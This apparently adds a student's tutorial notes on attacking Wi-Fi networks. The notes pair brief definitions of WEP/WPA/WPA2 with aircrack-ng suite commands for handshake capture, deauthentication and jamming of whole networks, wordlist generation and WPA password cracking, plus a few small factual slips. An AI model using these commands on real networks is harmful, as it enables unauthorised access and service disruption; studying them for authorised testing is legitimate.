@@ -1,0 +1,101 @@
+                                                        Hacking Wireless Networks
+
+Wireless network - Wireless network is a computer network that uses wireless data connection between network nodes.
+
+Access Point: Access Point (AP) or Wireless Access Point (WAP) is a hardware device that allows wireless connectivity to the end devices.
+
+Service Set Identifier (SSID): A 32 bit identification string of the Access Point, the AP's name. SSID inserted into the header of every data packet.
+
+Basic Service Set Identifier (BSSID): MAC address of the Access Point.
+
+Wifi :
+Wi-Fi is a local area networking technology based on the IEEE 802.11 standard.
+Wi-Fi stands for Wireless-Fidility.
+
+Wireless encryption :
+Wired Equivalent Privacy (WEP) - 1997
+- Designed to provide the same level of security as that of a wired LAN.
+- WEP is Standard protocol before 2004.
+- Use Pre-shared Key, and plain text transmission.
+
+Wi-Fi Protected Access (WPA) - 2003 by Wi-Fi Alliance :
+- Used for WLAN network based on 802.11i
+- It was developed in response to the weaknesses of WEP, and therefore improves on WEP's authentication and encryption features.
+- WPA make it more secure by adding extra security mechanism and algorithms to stop unauthorized access.
+- WPA delivers a level of security way beyond anything that WEP can offer.
+
+WPA2 - 2004 :
+- Strong Encryption AES (Advanced Encryption Standard) - 128-256 bit key
+- In WPA2, when user try to connect with AP/Router, key is Encrypted by AES and then transmitted.
+
+Keep your password secure and strong :
+Website - https://howsecureismypassword.net/
+Use this upper website to check how strong your password is
+
+Capturing Wireless Communication Packets :
+
+Device you can use -  Leoxsys External WIFI Adapter - 150HGN : https://www.amazon.in/Leoxsys-150Mbps-Wireless-external-LEO-HG150N/dp/B00IWT1JA6
+https://www.amazon.in/TP-Link-Wireless-Adapter-Archer-T2U/dp/B07P681N66/ref=sr_1_2_sspa?keywords=tp%2Blink%2Bwifi%2Badapter&qid=1643017101&sprefix=tp%2Blink
+%2Bwifi%2Caps%2C230&sr=8-2-spons&spLa=ZW5jcnlwdGVkUXVhbGlmaWVyPUEzQkNRSUFJQ0hFMjEmZW5jcnlwdGVkSWQ9QTA2ODYwODYzNzJBM1FBRTNBNENTJmVuY3J5cHRlZEFkSWQ9QTA5NzY2NTBESllVRlRZOT
+lNWlcmd2lkZ2V0TmFtZT1zcF9hdGYmYWN0aW9uPWNsaWNrUmVkaXJlY3QmZG9Ob3RMb2dDbGljaz10cnVl&th=1
+Tool - Airmon-ng , Airodump-ng
+
+Modes of Using a Wireless Adapter :
+
+- Standard Mode | Managed Mode : Which every person use to access and use the services of a particular Access Point.
+
+- Monitoring Mode : The mode which allows a computer with a wireless network interface controller to monitor all traffic received from the wireless network.
+
+Some names we can see while capturing the flags :
+
+ESSID  : The name of the AP.
+BSSID : MAC Address of the Access Point.
+CIPHER : The cipher detected One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used with WPA2.
+PWR : The lower the number the nearest the wifi.
+Beacons : Number of beacons sent by the AP. Each access point sends about ten beacons per second at the lowest rate (1M), so they can usually be picked up from very far 
+#Data  : Number of captured data packets including data broadcast packets.
+#s : Number of data packets per second measure over the last 10 seconds.
+CH : Channel number (taken from beacon packets). Note: sometimes packets from other channels are captured even if airodump-ng is not hopping, because
+of radio interference.
+MB : Maximum speed supported by the AP. The dot (after 54 above) indicates short preamble is supported. 'e' indicates that the network has QoS (802.11e) enabled.
+ENC : Encryption  algorithm  in  use.
+CIPHER : The cipher detected. One of CCMP, WRAP, TKIP, WEP, WEP40, or WEP104. Not mandatory, but TKIP is typically used with WPA and CCMP is typically used with WPA2. 
+AUTH :  The authentication protocol used.
+
+We will use crunch for making a wordlist.
+#crunch 3 6 bcscsnujv@# > This command will create a wordlist with minimum 3 characters and maximum 6 characters.
+#crucnh 10 10 9876543210 > This will create a wordlist with contains all mobile numbers.
+
+Airmon-ng in the terminal which will be used to activate the Monitoring Mode. This script can be used to enable monitor mode on wireless interfaces. It may also be
+used to go back from monitor mode to managed mode. Entering the airmon-ng command without parameters will show the interfaces status. It can also list/kill programs
+that can interfere with the wireless card operation.
+
+Commands :
+#ifconfig - For checking if our wifi is connected
+#iwconfig - For checking if our wifi has managed mode or monitor mode
+#airmon-ng start wlan0 - For starting monitoring mode on wlan0
+#kill PIDs - For killing the unnecessery PID
+#airmon-ng start wlan0 - For starting monitoring mode on wlan0 - We have to give this command again for enabling monitor mode.
+#iwconfig - For checking our updated name of wifi interface - wlan0mon
+#airodump-ng wlan0mon - For capturing all packets.
+#airodump-ng --bssid 7E:A9:6B:50:49:50 -c 3 -w /root/Desktop/wififile wlan0mon - It will show all the devices mac address which are connected with wifi.
+#aireplay-ng -0 15 -a 83:H8:92:N2:23:52(Router's Mac address) -c BB:H7:K7:HN:86:29(Device mac address which we want to disconnect) wlan0mon
+#aircrack-ng /root/Downloads/wififile-01.cap -w /usr/share/wordlists/rockyou.txt - For cracking the password.
+#aireplay-ng -0 0 -a 83:H8:92:N2:23:52(Router's Mac address) -c BB:H7:K7:HN:86:29(Device mac address which we want to disconnect) wlan0mon - it will disconnect this
+particular device until our command is running.
+#aireplay-ng -0 0 -a 9V:8H:DE:48:U8:39 wlan0mon - For jamming the full wifi.
+
+we can use fluxion or wifite tool. They both are automation tool they will do everything on their own.
+wifite :
+#wifite --wpa
+Press ctrl+c for giving input and type the wifi number or type all for every wifi.
+
+You can use kali inbuilt wordlist for password.
+/usr/share/wordlists
+
+Starting Dumping Packets through another tool, Airodump-ng. airodump-ng  is  used  for packet capturing of raw 802.11 frames for the intent of using them. Additionally, airodump-ng writes out a text file containing the details of all access points and clients seen.
+
+Command:-
+-------------------
+$ airodump-ng wlan0mon // start dumping on wlan0mon
+$ airodump-ng --bssid <bssid name> -c <CH number> -w <filename> wlan0mon //start capturing and dumping the packets and storing it on the Kali OS.
